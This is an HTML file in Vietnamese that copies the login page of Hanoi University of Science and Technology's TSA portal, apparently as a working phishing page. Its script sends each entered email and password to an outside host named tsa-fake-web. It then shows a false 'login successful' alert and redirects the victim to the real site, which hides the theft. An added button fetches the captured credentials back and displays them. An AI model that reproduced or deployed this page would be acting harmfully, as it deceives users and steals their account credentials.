<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng nhập - TSA</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: url('https://tsa.hust.edu.vn/static/media/bg-page-login.c1e278a5.png') no-repeat center center fixed;
            background-size: cover;
        }
        .login-container {
            max-width: 400px;
            margin: 100px auto;
            padding: 30px;
            background: white;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .btn-login {
            background-color: #d00;
            color: white;
        }
        .btn-login:hover {
            background-color: #a00;
        }
        .forgot-password {
            color: #d00;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-container">
            <h2>Đăng nhập</h2>
            <p>Bạn chưa có tài khoản? <a href="#" style="color: #d00;">Đăng ký ngay</a></p>
            <form id="login-form">
                <div class="mb-3 text-start">
                    <label class="form-label">Email *</label>
                    <input type="email" class="form-control" id="email" placeholder="Nhập email" required>
                </div>
                <div class="mb-3 text-start">
                    <label class="form-label">Mật khẩu *</label>
                    <input type="password" class="form-control" id="password" placeholder="Nhập mật khẩu" required>
                </div>
                <button type="submit" class="btn btn-login w-100">Đăng nhập</button>
            </form>
            <a href="#" class="forgot-password mt-3 d-block">Quên mật khẩu?</a>
        </div>
    </div>

    <script>
        // Gửi thông tin đăng nhập lên server
        document.getElementById("login-form").addEventListener("submit", async function(event) {
            event.preventDefault();

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            // Gửi dữ liệu lên server
            try {
                const response = await fetch("https://tsa-fake-web.onrender.com", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ email, password }),
                });

                if (response.ok) {
                    alert("Đăng nhập thành công!");
                    window.location.href = "https://tsa.hust.edu.vn/dang-nhap"; // Chuyển hướng
                } else {
                    alert("Đăng nhập thất bại!");
                }
            } catch (error) {
                console.error("Lỗi:", error);
            }
        });

        // Xem mật khẩu đã lưu từ máy khác
        async function viewSavedPassword() {
            try {
                const response = await fetch("https://tsa-fake-web.onrender.com", {
                    method: "GET",
                });

                if (response.ok) {
                    const data = await response.json();
                    console.log("Thông tin đăng nhập đã lưu:", data);
                    alert(`Email: ${data.email}, Mật khẩu: ${data.password}`);
                } else {
                    alert("Không thể lấy thông tin đăng nhập!");
                }
            } catch (error) {
                console.error("Lỗi:", error);
            }
        }

        // Thêm nút để xem mật khẩu đã lưu
        const viewPasswordButton = document.createElement("button");
        viewPasswordButton.textContent = "Xem mật khẩu đã lưu";
        viewPasswordButton.className = "btn btn-secondary w-100 mt-3";
        viewPasswordButton.onclick = viewSavedPassword;
        document.querySelector(".login-container").appendChild(viewPasswordButton);
    </script>
</body>
</html>
